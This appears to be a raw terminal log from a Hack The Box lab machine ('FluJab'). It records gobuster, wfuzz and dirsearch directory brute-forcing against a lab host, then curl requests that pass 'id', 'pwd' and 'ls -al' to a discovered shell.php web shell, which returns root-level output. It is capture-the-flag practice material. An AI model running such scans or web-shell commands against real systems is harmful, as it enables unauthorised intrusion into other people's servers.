+https://custoomercare.megabank.htb/movies (Status: 301)
+https://custoomercare.megabank.htb/staff (Status: 301)
+https://custoomercare.megabank.htb/hardware (Status: 301)
+https://custoomercare.megabank.htb/wireless (Status: 301)
+https://custoomercare.megabank.htb/p (Status: 301)
+https://custoomercare.megabank.htb/global (Status: 301)
+https://custoomercare.megabank.htb/screenshots (Status: 301)
+https://custoomercare.megabank.htb/apps (Status: 301)
+https://custoomercare.megabank.htb/version (Status: 301)
+https://custoomercare.megabank.htb/mobile (Status: 301)
+https://custoomercare.megabank.htb/other (Status: 301)
+https://custoomercare.megabank.htb/directory (Status: 301)
+https://custoomercare.megabank.htb/tech (Status: 301)
+https://custoomercare.megabank.htb/online (Status: 301)
+https://custoomercare.megabank.htb/advertising (Status: 301)
+https://custoomercare.megabank.htb/welcome (Status: 301)
+https://custoomercare.megabank.htb/admin (Status: 301)
+https://custoomercare.megabank.htb/t (Status: 301)
+https://custoomercare.megabank.htb/policy (Status: 301)
+https://custoomercare.megabank.htb/2001 (Status: 301)
+https://custoomercare.megabank.htb/faqs (Status: 301)
+https://custoomercare.megabank.htb/link (Status: 301)
+https://custoomercare.megabank.htb/releases (Status: 301)
+https://custoomercare.megabank.htb/member (Status: 301)
+https://custoomercare.megabank.htb/training (Status: 301)
+https://custoomercare.megabank.htb/space (Status: 301)
+https://custoomercare.megabank.htb/join (Status: 301)
+https://custoomercare.megabank.htb/static (Status: 301)
+https://custoomercare.megabank.htb/health (Status: 301)
+https://custoomercare.megabank.htb/weather (Status: 301)
+https://custoomercare.megabank.htb/reports (Status: 301)
+https://custoomercare.megabank.htb/scripts (Status: 301)
+https://custoomercare.megabank.htb/browse (Status: 301)
+https://custoomercare.megabank.htb/windows (Status: 301)
+https://custoomercare.megabank.htb/showallsites (Status: 301)
+https://custoomercare.megabank.htb/programs (Status: 301)
+https://custoomercare.megabank.htb/EWbutton_Community (Status: 301)
+https://custoomercare.megabank.htb/FireFox_Reco (Status: 301)
+https://custoomercare.megabank.htb/EWbutton_GuestBook (Status: 301)
+https://custoomercare.megabank.htb/menu (Status: 301)
+https://custoomercare.megabank.htb/EuropeMirror (Status: 301)
+https://custoomercare.megabank.htb/entertainment (Status: 301)
+https://custoomercare.megabank.htb/2000 (Status: 301)
+https://custoomercare.megabank.htb/Home (Status: 301)
+https://custoomercare.megabank.htb/newsletters (Status: 301)
+https://custoomercare.megabank.htb/pr (Status: 301)
+https://custoomercare.megabank.htb/32 (Status: 301)
+https://custoomercare.megabank.htb/categories (Status: 301)
+https://custoomercare.megabank.htb/assets (Status: 301)
+https://custoomercare.megabank.htb/detail (Status: 301)
+https://custoomercare.megabank.htb/strona_11 (Status: 301)
+https://custoomercare.megabank.htb/strona_14 (Status: 301)
+https://custoomercare.megabank.htb/strona_6 (Status: 301)
+https://custoomercare.megabank.htb/strona_2 (Status: 301)
+https://custoomercare.megabank.htb/36 (Status: 301)
+https://custoomercare.megabank.htb/strona_8 (Status: 301)
+https://custoomercare.megabank.htb/strona_1 (Status: 301)
+https://custoomercare.megabank.htb/strona_18 (Status: 301)
+https://custoomercare.megabank.htb/strona_3 (Status: 301)
+https://custoomercare.megabank.htb/strona_4 (Status: 301)
+https://custoomercare.megabank.htb/strona_16 (Status: 301)
+https://custoomercare.megabank.htb/strona_17 (Status: 301)
+https://custoomercare.megabank.htb/strona_7 (Status: 301)
+https://custoomercare.megabank.htb/strona_9 (Status: 301)
+https://custoomercare.megabank.htb/strona_5 (Status: 301)
+https://custoomercare.megabank.htb/strona_15 (Status: 301)
+https://custoomercare.megabank.htb/strona_10 (Status: 301)
+https://custoomercare.megabank.htb/strona_12 (Status: 301)
+https://custoomercare.megabank.htb/registration (Status: 301)
+https://custoomercare.megabank.htb/strona_13 (Status: 301)
+https://custoomercare.megabank.htb/strona_21 (Status: 301)
+https://custoomercare.megabank.htb/strona_19 (Status: 301)
+https://custoomercare.megabank.htb/strona_20 (Status: 301)
+https://custoomercare.megabank.htb/40 (Status: 301)
+https://custoomercare.megabank.htb/glossary (Status: 301)
+https://custoomercare.megabank.htb/showthread (Status: 301)
+https://custoomercare.megabank.htb/kontakt (Status: 301)
+https://custoomercare.megabank.htb/mailman (Status: 301)
+https://custoomercare.megabank.htb/cnt (Status: 301)
+https://custoomercare.megabank.htb/order (Status: 301)
+https://custoomercare.megabank.htb/tutorials (Status: 301)
+https://custoomercare.megabank.htb/network (Status: 301)
+https://custoomercare.megabank.htb/r (Status: 301)
+https://custoomercare.megabank.htb/listinfo (Status: 301)
+https://custoomercare.megabank.htb/35 (Status: 301)
+https://custoomercare.megabank.htb/33 (Status: 301)
+https://custoomercare.megabank.htb/whitepapers (Status: 301)
+https://custoomercare.megabank.htb/privacy_policy (Status: 301)
+https://custoomercare.megabank.htb/footer (Status: 301)
+https://custoomercare.megabank.htb/audio (Status: 301)
+https://custoomercare.megabank.htb/politics (Status: 301)
+https://custoomercare.megabank.htb/it (Status: 301)
+https://custoomercare.megabank.htb/37 (Status: 301)
+https://custoomercare.megabank.htb/d (Status: 301)
+https://custoomercare.megabank.htb/php (Status: 301)
+https://custoomercare.megabank.htb/eng (Status: 301)
+https://custoomercare.megabank.htb/text (Status: 301)
+https://custoomercare.megabank.htb/podcasts (Status: 301)
+https://custoomercare.megabank.htb/post (Status: 301)
+https://custoomercare.megabank.htb/39 (Status: 301)
+https://custoomercare.megabank.htb/chat (Status: 301)
+https://custoomercare.megabank.htb/34 (Status: 301)
+https://custoomercare.megabank.htb/science (Status: 301)
+https://custoomercare.megabank.htb/nl (Status: 301)
+https://custoomercare.megabank.htb/adview (Status: 301)
+https://custoomercare.megabank.htb/x (Status: 301)
+https://custoomercare.megabank.htb/account (Status: 301)
+https://custoomercare.megabank.htb/intro (Status: 301)
+https://custoomercare.megabank.htb/FAQ (Status: 301)
+https://custoomercare.megabank.htb/comment (Status: 301)
+^C
+[!] Keyboard interrupt detected, terminating.
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/viewforum: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/forms: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/dot: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/affiliates: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/uk: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/corporate: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/privacypolicy: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/42: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/sponsors: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/testimonials: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/donate: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/flash: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/upload: context canceled
+2018/12/31 17:25:07 [!] Get https://custoomercare.megabank.htb/node: context canceled
+=====================================================
+2018/12/31 17:25:07 Finished
+=====================================================
+root@kali:~/HTB/FluJab# wfuzz -X GET -c --hc 301 -t 50 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://custoomercare.megabank.htb/FUZZ.php
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://custoomercare.megabank.htb/FUZZ.php
+Total requests: 220560
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+
+Total time: 390.3030
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: 565.0993
+
+root@kali:~/HTB/FluJab# 
+
+root@kali:~/HTB/FluJab# dirsearch -u https://custoomercare.megabank.htb -e php,txt,htm,html
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: php, txt, htm, html | Threads: 10 | Wordlist size: 7020
+
+Error Log: /opt/dirsearch/logs/errors-18-12-31_17-36-24.log
+
+Target: https://custoomercare.megabank.htb
+
+[17:36:24] Starting: 
+[17:36:24] 400 -  166B  - /%2e%2e/google.com
+[17:36:37] 200 -  521B  - /index.php
+[17:36:42] 200 -   49B  - /shell.php
+
+Task Completed
+root@kali:~/HTB/FluJab# curl -k -v https://custoomercare.megabank.htb/shell.php
+*   Trying 10.10.10.144...
+* TCP_NODELAY set
+* Connected to custoomercare.megabank.htb (10.10.10.144) port 443 (#0)
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server accepted to use http/1.1
+* Server certificate:
+*  subject: CN=ClownWare.htb; ST=LON; C=UK; emailAddress=bozo@clownware.htb; O=ClownWare Ltd; OU=ClownWare Protection Services
+*  start date: Nov 28 14:57:03 2018 GMT
+*  expire date: Nov 27 14:57:03 2023 GMT
+*  issuer: CN=ClownWare Certificate Authority; ST=LON; C=UK; emailAddress=bozo@clownware.htb; O=ClownWare Ltd.; OU=ClownWare Protection Services
+*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
+> GET /shell.php HTTP/1.1
+> Host: custoomercare.megabank.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:55:45 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Server: ClownWare Proxy
+< 
+
+<!--
+53cret 5shell
+shell.php?cmd=[commands]
+-->
+* Connection #0 to host custoomercare.megabank.htb left intact
+root@kali:~/HTB/FluJab#
+root@kali:~/HTB/FluJab# curl -k -X GET https://custoomercare.megabank.htb/shell.php -d 'cmd=id'
+
+<!--
+53cret 5shell
+shell.php?cmd=[commands]
+-->
+root@kali:~/HTB/FluJab# curl -k -X GET https://custoomercare.megabank.htb/shell.php -p 'cmd=id'
+
+<!--
+53cret 5shell
+shell.php?cmd=[commands]
+-->
+curl: (6) Could not resolve host: cmd=id
+root@kali:~/HTB/FluJab# curl -k -X GET "https://custoomercare.megabank.htb/shell.php?cmd=id"
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>MASTERHACKERZ ONLY!!</title>
+        <style type="text/css">
+       body { 
+        background-color: #000;
+        color: green; 
+        text-indent: 50px; 
+        font-size: 1.5em; 
+       }
+
+       img {
+              width: 55%;
+              height: auto;
+       }
+
+    </style>
+<body>
+<pre>
+<center>
+<H2>5up3r 1337 r00t 9r1v 5h311 v1.0.3b</H2>Use: /shell.php?cmd=[commands]
+--------------------------------------------------------------
+
+uid=0(root) gid=0(root) groups=0(root)
+
+</center>
+</pre> 
+</body>root@kali:~/HTB/FluJab# curl -k -X GET "https://custoomercare.megabank.htb/shell.php?cmd=pwd"
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>MASTERHACKERZ ONLY!!</title>
+        <style type="text/css">
+       body { 
+        background-color: #000;
+        color: green; 
+        text-indent: 50px; 
+        font-size: 1.5em; 
+       }
+
+       img {
+              width: 55%;
+              height: auto;
+       }
+
+    </style>
+<body>
+<pre>
+<center>
+<H2>5up3r 1337 r00t 9r1v 5h311 v1.0.3b</H2>Use: /shell.php?cmd=[commands]
+--------------------------------------------------------------
+
+/root
+
+</center>
+</pre> 
+</body>root@kali:~/HTB/FluJab# curl -k -X GET "https://custoomercare.megabank.htb/shell.php?cmd=ls -al"
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>MASTERHACKERZ ONLY!!</title>
+        <style type="text/css">
+       body { 
+        background-color: #000;
+        color: green; 
+        text-indent: 50px; 
+        font-size: 1.5em; 
+       }
+
+       img {
+              width: 55%;
+              height: auto;
+       }
+
+    </style>
+<body>
+<pre>
+<center>
+<H2>5up3r 1337 r00t 9r1v 5h311 v1.0.3b</H2>Use: /shell.php?cmd=[commands]
+--------------------------------------------------------------
+
+</center>
+    total 56
+    drwx------  6 root root 4096 Dec  2 00:04 .
+    drwxr-xr-x 23 root root 4096 Nov 28 01:22 ..
+    -rw-r--r--  1 root root  597 Nov 28 01:46 .bashrc
+    drwx------  2 root root 4096 Dec  1 21:46 .cache
+    drwxrwxrwx  2 root root 4096 Nov 27 16:56 .config
+    -rw-------  1 root root  403 Dec  2 00:04 .mysql_history
+    drwxr-xr-x  2 root root 4096 Nov 27 13:52 .nano
+    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+    -r--------  1 root root   34 Nov 28 01:45 root.txt
+    -rw-r--r--  1 root root   66 Nov 27 21:18 .selected_editor
+    drwxr-xr-x  2 root root 4096 Nov 27 13:57 .ssh
+    -rw-r--r--  1 root root  173 Nov 28 01:06 .wget-hsts
+    -rw-------  1 root root   52 Nov 27 13:57 .Xauthority
+
+
+</center>
+</pre> 
+</body>root@kali:~/HTB/FluJab#
